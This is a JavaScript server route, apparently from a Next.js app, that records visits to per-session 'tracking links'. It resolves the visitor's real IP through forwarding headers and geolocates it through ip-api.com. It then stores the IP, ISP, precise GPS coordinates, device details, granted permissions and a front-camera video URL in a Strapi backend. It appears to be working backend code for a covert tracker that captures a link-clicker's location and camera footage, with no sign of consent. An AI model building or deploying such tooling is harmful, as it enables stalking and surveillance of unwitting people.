export async function POST(req) {
  try {
    const body = await req.json();
    const { trackingId, locationData, permissions, userAgent, screen, videoUrl } = body;

    // Get real IP — try multiple header variations
    const realIP = req.headers.get("x-real-ip") ||
                   req.headers.get("X-Real-IP") ||
                   req.headers.get("cf-connecting-ip") ||
                   req.headers.get("x-forwarded-for")?.split(",")[0].trim() ||
                   body.realIP ||  // fallback: read from body if Worker sent it there
                   null;

    console.log("Real IP received:", realIP);
    console.log("All headers:", Object.fromEntries(req.headers.entries()));

    const sessionsRes = await fetch(
      process.env.STRAPI_URL + "/api/tracking-sessions"
    );
    const sessionsData = await sessionsRes.json();

    const session = sessionsData.data.find(
      s => s.tracking_link?.includes(trackingId)
    );

    if (!session) {
      return new Response(JSON.stringify({ error: "Session not found" }), { status: 400 });
    }

    // Use real IP for location lookup
    let ipData = {};
    try {
      if (realIP && realIP !== "unknown") {
        console.log("Looking up IP:", realIP);
        const ipRes = await fetch(`http://ip-api.com/json/${realIP}`);
        ipData = await ipRes.json();
        console.log("IP data:", ipData);
      } else {
        console.log("No real IP found, using server IP");
        const ipRes = await fetch("http://ip-api.com/json/");
        ipData = await ipRes.json();
      }
    } catch (e) {
      console.error("IP lookup failed:", e);
    }

    const ua = userAgent || "";
    const os = ua.includes("Windows") ? "Windows"
      : ua.includes("Mac") ? "MacOS"
      : ua.includes("Android") ? "Android"
      : ua.includes("iPhone") || ua.includes("iPad") ? "iOS"
      : ua.includes("Linux") ? "Linux" : "Unknown";

    const browser = ua.includes("Chrome") ? "Chrome"
      : ua.includes("Firefox") ? "Firefox"
      : ua.includes("Safari") ? "Safari"
      : ua.includes("Edge") ? "Edge" : "Unknown";

    const device_type = ua.includes("Mobile") || ua.includes("Android") || ua.includes("iPhone")
      ? "Mobile" : "Desktop";

    const saveRes = await fetch(
      process.env.STRAPI_URL + "/api/tracking-events",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          data: {
            session: session.documentId,
            ip_address: realIP || ipData?.query || "unknown",
            city: ipData?.city || "unknown",
            country: ipData?.country || "unknown",
            isp: ipData?.isp || "unknown",
            latitude: locationData?.latitude ?? null,
            longitude: locationData?.longitude ?? null,
            user_agent: userAgent || "unknown",
            screen_resolution: screen || "unknown",
            os,
            browser,
            device_type,
            permissions: permissions || {},
            front_video: videoUrl || null,
            triggered_at: new Date().toISOString()
          }
        })
      }
    );

    const saveData = await saveRes.json();

    if (!saveRes.ok) {
      return new Response(
        JSON.stringify({ error: "Strapi error", details: saveData }),
        { status: 400 }
      );
    }

    return new Response(JSON.stringify({ success: true }), { status: 200 });

  } catch (err) {
    console.error("SERVER ERROR:", err);
    return new Response(JSON.stringify({ error: "Server error" }), { status: 500 });
  }
}